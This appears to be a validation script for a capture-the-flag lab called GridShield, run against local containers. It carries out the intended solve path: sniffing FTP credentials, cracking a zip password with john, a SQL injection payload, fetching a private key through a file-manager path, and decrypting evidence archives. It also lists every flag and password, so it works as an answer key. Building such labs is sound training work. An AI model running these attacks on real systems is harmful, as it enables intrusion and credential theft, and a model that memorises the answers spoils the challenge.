#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

export GRIDSHIELD_BUILD_LOG_DIR="${GRIDSHIELD_BUILD_LOG_DIR:-$(current_build_dir)}"
cd "$PROJECT_ROOT"

scripts/run-log.sh "wait for services" -- bash -lc 'for i in {1..60}; do docker exec gridshield_m2 nc -z 127.0.0.1 21 && docker exec gridshield_m2 nc -z 127.0.0.1 80 && docker exec gridshield_m1 nc -z 198.51.100.20 21 && exit 0; sleep 2; done; exit 1'
scripts/run-log.sh "flag list" -- bash -lc 'test "$(wc -l < generated/ctfd/flags.txt)" -eq 10'
scripts/run-log.sh "dns and public-sim routing" -- bash -lc 'docker exec gridshield_m1 getent hosts ftp.gridvault-records.test | grep "198.51.100.20"; docker exec gridshield_m1 getent hosts update.gridvault-records.test | grep "198.51.100.20"; docker exec gridshield_m1 ip route get 198.51.100.20'
scripts/run-log.sh "m1 evidence and persistence note" -- bash -lc 'test -s generated/m1/evidence/archive.enc; test -s generated/m1/evidence/endpoint.vmem; grep -Ei "outbound|restart|persistence" generated/m1/evidence/case_notes.txt; docker exec gridshield_m1 sed -n "1,80p" /etc/systemd/system/wupdate.service | grep "CTF{PERSISTENCE_SYSTEMD_WUPDATE_SERVICE}"'
scripts/run-log.sh "m1 memory clues" -- bash -lc 'tmp=$(mktemp); strings -a -n 8 generated/m1/evidence/endpoint.vmem > "$tmp"; for pat in wupdate ep-009 cbfs01 INTERVAL=20 update.gridvault-records.test ftp.gridvault-records.test sitebackup 4a7f3c91b2d0e865 aes-256-cbc pbkdf2 "CTF{SCRIPT_RECOVERED_RUNTIME_CREDS_NOT_HARDCODED}"; do grep -F "$pat" "$tmp"; done; ! grep -F "Str0ng#Bkp2024" "$tmp"; rm -f "$tmp"'
scripts/run-log.sh "m1 archive decrypt" -- bash -lc 'tmp=$(mktemp -d); openssl enc -aes-256-cbc -d -pbkdf2 -k "4a7f3c91b2d0e865" -in generated/m1/evidence/archive.enc -out "$tmp/archive.tar.gz"; tar -xzf "$tmp/archive.tar.gz" -C "$tmp"; grep -R "CTF{VICTIM_ARCHIVE_DECRYPTED_EP009}" "$tmp"; grep -R "20-second" "$tmp"; rm -rf "$tmp"'
scripts/run-log.sh "live ftp on public-sim address" -- bash -lc 'tmp=$(mktemp); timeout 45 docker exec gridshield_m1 tcpdump -i any -nn -s0 -A "host 198.51.100.20 and port 21" > "$tmp" 2>/dev/null || true; grep "USER sitebackup" "$tmp"; grep "PASS Str0ng#Bkp2024" "$tmp"; rm -f "$tmp"'
scripts/run-log.sh "m2 zip and web" -- bash -lc 'tmp=$(mktemp -d); cp generated/m2/ftp/encrypted_ops.zip "$tmp/"; cp generated/m2/ftp/ops_candidates.txt "$tmp/"; cd "$tmp"; zip2john encrypted_ops.zip > encrypted_ops.hash; john --wordlist=ops_candidates.txt encrypted_ops.hash >/dev/null; john --show encrypted_ops.hash | grep "N0v@S3c!2024"; unzip -P "N0v@S3c!2024" -q encrypted_ops.zip -d out; grep "CTF{ZIP_UNLOCKED_CPANEL_HIDDEN_SECURE_MGMT}" out/admin_notes/cpanel_access.txt; rm -rf "$tmp"; curl -fsS http://127.0.0.1:8080/secure_mgmt/ | grep "CTF{DIRB_FOUND_SECURE_MGMT_AND_DB_ADMIN}"'
scripts/run-log.sh "m2 sqli and key" -- bash -lc 'tmp=$(mktemp -d); curl -fsS -c "$tmp/cookies.txt" -d "username=nsadmin&password=N0v@S3c!2024" http://127.0.0.1:2083/login.php | grep "login ok"; curl -fsS -b "$tmp/cookies.txt" "http://127.0.0.1:2083/secure_mgmt/dashboard.php?search=ep-009%27%20OR%20%271%27%3D%271%27--%20-" > "$tmp/sqli.html"; grep "CTF{SQLI_AGENT_ACTIVITY_DUMP_EP009}" "$tmp/sqli.html"; curl -fsS -b "$tmp/cookies.txt" "http://127.0.0.1:2083/filemanager.php?path=/internal/secure_mgmt/keys/vpn_access.pem" > "$tmp/vpn_access.pem"; chmod 600 "$tmp/vpn_access.pem"; ssh-keygen -y -P "GridVPN#2026" -f "$tmp/vpn_access.pem" >/dev/null; rm -rf "$tmp"'
scripts/run-log.sh "m3 and m4 generated artifacts" -- bash -lc 'grep -R "198.18.45.23" generated/m3/log; grep -R "CTF{VPN_DROPOUT_REAL_IP_198_18_45_23_EXPOSED}" generated/m3/log; grep -nFx "Infradev#99" generated/m3/openvpn/passphrase_candidates.txt; grep -R "CTF{OVPN_CONFIG_DEVUSER_DEV_KEY_INFRADEV99}" <(openssl enc -aes-256-cbc -d -pbkdf2 -k "Infradev#99" -in generated/m3/openvpn/clients/operator.ovpn.enc 2>/dev/null); test -s generated/m4/home/devuser/Backups/workstation_home_backup_2026-05-16.img'
scripts/run-log.sh "public sanitization scan" -- bash -lc 'if grep -R -I -n -E "national[_]id\\.pdf|Contract[_]email\\.pdf|JE[.]jpg|Gridshield[_]VPN|team1[_]member|gridshield[_]team1|CASE_CLOSED[_]JE_GRIDSHIELD_2026|CASE_CLOSED[_]DJT|G[h]ostNet|203[.]0[.]113|M[5]" --exclude-dir=.git .; then exit 1; fi'
echo "Test log: $GRIDSHIELD_BUILD_LOG_DIR"
